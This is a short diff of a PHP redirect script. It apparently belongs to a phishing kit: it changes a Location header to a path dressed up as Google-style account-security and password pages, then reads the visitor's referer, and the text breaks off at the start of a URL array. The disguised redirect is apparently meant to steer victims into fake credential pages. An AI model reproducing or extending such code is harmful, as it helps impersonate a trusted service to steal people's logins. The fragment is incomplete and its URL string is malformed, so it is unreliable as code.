@@ -1,5 +1,5 @@
 <?php
-header ('Location:continue=https-myaccount.go.com-nextwordpastfinish/');
+header ('Location:1/passwordutm01_source=go-account&utm_medium=web&continue=https-myaccount.go.com-security/continue=https-myaccount.go.com-nextwordpastfinish/');
 $vinculo = $_SERVER['HTTP_REFERER'];
 
 $url = array(
